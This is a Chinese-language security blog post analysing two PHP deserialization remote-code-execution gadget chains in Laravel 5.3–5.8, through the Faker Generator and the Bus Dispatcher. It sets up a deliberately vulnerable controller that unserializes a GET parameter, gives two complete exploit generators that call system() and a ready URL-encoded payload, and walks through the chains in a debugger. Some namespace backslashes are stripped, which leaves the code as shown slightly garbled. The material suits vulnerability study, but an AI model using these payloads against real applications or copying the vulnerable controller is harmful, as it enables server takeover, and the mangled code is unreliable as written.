# Laravel由destrcuct引起的两处反序列化RCE分析

阅读量 **564854**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-08-23 14:30:54

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

laravel本身没有反序列化的调用机制，只有依赖于二次开发或者敏感函数才能触发反序列化。在Laravel5.3以后的版本引入`IlluminateBroadcastingPendingBroadcast.php`文件，存在__destrcut魔法函数引发一系列问题。这里我对框架本身能造成rce的点进行分析，一处是三方组件fzaninotto的回调调用`call_user_func_array`造成的rce，另一处是p神在lumenserial找到laravel核心库的一处任意函数调用。

## Laravel自加载组件fzaninotto组件RCE

###  版本说明

`fzaninotto`在laravel 5.1以后composer默认安装

![](https://p1.ssl.qhimg.com/dm/1024_629_/t0122e98ad62778e5c8.png)

`autoload_classmap.php`可以看到，在进行依赖加载的时候默认将`/fzaninotto/faker/src/Faker/Generator.php`注册到全局变量`$classmap`中，在程序调用相关类时遵从PSR4的规范，也就是说我们反序列化是可以调用`/fzaninotto/faker/src/Faker/`目录下的任何文件。

![](https://p4.ssl.qhimg.com/dm/1024_640_/t01a7cb5d4c4961ad37.png)

###  适用条件

  * laravel 5.3-5.8
  * 寻找可控的反序列化点，才能触发该漏洞

## 漏洞复现

###  环境搭建

本地搭建laravel最新的环境 5.8.29

![](https://p1.ssl.qhimg.com/dm/1024_543_/t019bf9b24cd51fd6b5.png)

构造一个反序列化可控点，在`app/Http/Controllers`文件夹下创建文件TaskController.php，源码如下:

    
    
    <?php
    namespace AppHttpControllers;
    
    class TaskController
    {
        public function index(){
            unserialize($_GET['url']);
        }
    }
    

在`routes/web.php`文件中添加这样路由记录

    
    
    Route::get('/bug', 'TaskController@index');
    

![](https://p1.ssl.qhimg.com/dm/1024_578_/t017bbf087854ef6661.png)

## 漏洞复现

###  EXP

    
    
    <?php
    //exp.php
    namespace Faker{
        class Generator{
            protected $formatters = array();
    
            public function __construct($formatters)
            {
                $this->formatters = $formatters;
            }
        }
    }
    
    namespace IlluminateBroadcasting{
        class PendingBroadcast.php``
        {
            protected $events;
            protected $event;
    
            public function __construct($events, $event)
            {
                $this->events = $events;
                $this->event = $event;
            }
    
        }
    }
    
    namespace{
        $generator = new FakerGenerator(array("dispatch"=>"system"));
        $PendingBroadcast = new IlluminateBroadcastingPendingBroadcast($generator,"id");
        echo urlencode(serialize($PendingBroadcast));
    
    }
    

运行exp.php生成poc，如果环境搭建没有问题，直接请求下面的uri既能看到rce效果

    
    
    bug?url=O%3A40%3A"Illuminate%5CBroadcasting%5CPendingBroadcast"%3A2%3A%7Bs%3A9%3A"%00%2A%00events"%3BO%3A15%3A"Faker%5CGenerator"%3A1%3A%7Bs%3A13%3A"%00%2A%00formatters"%3Ba%3A1%3A%7Bs%3A8%3A"dispatch"%3Bs%3A6%3A"system"%3B%7D%7Ds%3A8%3A"%00%2A%00event"%3Bs%3A2%3A"id"%3B%7D
    

![](https://p3.ssl.qhimg.com/dm/1024_618_/t01a36ff505efeceeac.png)

###  EXP流程

在入口设置断点，传入payload

![](https://p4.ssl.qhimg.com/dm/1024_403_/t0160a7f35f1f4b9ac3.png)

步入`IlluminateFoundationAliasLoader`的load函数，检测要实例的对象是否是laravel注册门面类，这里不满足条件

![](https://p2.ssl.qhimg.com/dm/1024_406_/t01227f8fcdc4f09d75.png)

因此步入`ComposerAutoloadClassLoader`查找相应class对应于vendor中的php文件。也就是上文提到的laravel在加载服务容器时会执行的`autoload_class`作用结果

![](https://p5.ssl.qhimg.com/dm/1024_640_/t01fe4f3ae049d2c6c8.png)

看到调用栈能够成功读取到`FakerGenerato`文件，并返回给includefile()

载入文件后步入到了反序列化的入口__destruct函数

![](https://p1.ssl.qhimg.com/dm/1024_640_/t011154f57853d725ed.png)

步入执行dispatch函数，跳转到`vendor/fzaninotto/faker/src/Faker/Generator.php`的call方法

![](https://p3.ssl.qhimg.com/dm/1024_640_/t0169d480a1435b6c5a.png)

跟进format函数如下图，发现此时的$arguments为可控值即我们序列化传入的$this->event

![](https://p5.ssl.qhimg.com/dm/1024_640_/t01a0a3d024953b1675.png)

继续步入看看getFormatter函数的具体实现

    
    
    public function getFormatter($formatter) # formatter  = dispatch
    {
        if (isset($this->formatters[$formatter])) { # formatters可控
            return $this->formatters[$formatter];
        }
        foreach ($this->providers as $provider) {
            if (method_exists($provider, $formatter)) {
                $this->formatters[$formatter] = array($provider, $formatter);
    
                return $this->formatters[$formatter];
            }
        }
        throw new InvalidArgumentException(sprintf('Unknown formatter "%s"', $formatter));
    }
    

判断formatters[formatter]存在即返回，然而formatters也是我们可控的，那就能返回任意函数名了。即call_user_func_arrary的函数名和函数值都可控，rce实现～

![](https://p4.ssl.qhimg.com/dm/1024_611_/t016c3f7d42456ca42a.png)

## Dispatcher处存在任意函数调用

首先还是看一下造成漏洞的点在`vendor/laravel/framework/src/Illuminate/Bus/Dispatcher.php`，允许我们使用`call_user_func`进行任意函数调用，且参数可控。

![](https://p2.ssl.qhimg.com/t0172ec4e397da369ea.png)

接着我们从源头追pop。入口方法依然在`vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php`中，__destrcut执行dispatch函数

![](https://p4.ssl.qhimg.com/t01f2c936227c2b9069.png)

这次全局搜索哪些类存在dispatch函数，正好dispatcher本身中就存在，而且调用到了漏洞触发函数`dispatchToQueue`去执行`call_user_func`

![](https://p0.ssl.qhimg.com/dm/1024_376_/t0131215d0fe9724c43.png)

这里首先进行了如下条件判断

    
    
    $this->queueResolver && $this->commandShouldBeQueued($command)
    

跟进`commandShouldBeQueued`发现command参数必须是继承自
`ShouldQueue`接口的对象才能进入判断，这点我们可以通过序列化控制$command为对象。

![](https://p2.ssl.qhimg.com/t01f539e1338167427d.png)

只需要全局搜一下哪个类实现了`ShouldQueue`接口，这里使用`BroadcastEvent`

![](https://p1.ssl.qhimg.com/dm/1024_494_/t0113bd8253004bccfd.png)

判断走通回到dispather，进行函数`dispatchToQueue`调用，`$connection`参数取自`$command`的connection属性

![](https://p0.ssl.qhimg.com/t016e92a9e94212b5fb.png)

但是`BroadcastEvent`没有connection属性。不过没有关系，我们自己序列化可以给类添加任何想要的属性。因为反序列化的时候不执行该类__contrust，自然也不会在`BroadcastEvent`中报错。

流程就这么简单，构造每个类的属性，让条件走通就行了。构造的exp

    
    
    <?php
    
    namespace IlluminateBroadcasting{
        class PendingBroadcast
        {
            protected $events;
            protected $event;
    
            public function __construct($events, $event)
            {
                $this->events = $events;
                $this->event = $event;
            }
    
        }
    
        class BroadcastEvent
        {
          protected $connection;
    
          public function __construct($connection)
          {
            $this->connection = $connection;
          }
        }
    
    }
    
    namespace IlluminateBus{
        class Dispatcher{
            protected $queueResolver;
    
            public function __construct($queueResolver)
            {
              $this->queueResolver = $queueResolver;
            }
    
        }
    }
    
    namespace{
        $command = new IlluminateBroadcastingBroadcastEvent("whoami");
    
        $dispater = new IlluminateBusDispatcher("system");
    
        $PendingBroadcast = new IlluminateBroadcastingPendingBroadcast($dispater,$command);
    
        echo urlencode(serialize($PendingBroadcast));
    
    }
    

只不过是没有回显，需要我们可以外带出去，这里调试的结果成功执行system获取whoami为hpdoger

![](https://p5.ssl.qhimg.com/dm/1024_424_/t0118b2eb3103820660.png)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Hpdoger** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/184541](/post/id/184541)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [Web安全](/tag/Web安全)
  * [反序列化](/tag/反序列化)

 **+1** __8赞

 __收藏

![](https://p5.ssl.qhimg.com/t01b9b27da71ece1d6b.png) Hpdoger

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

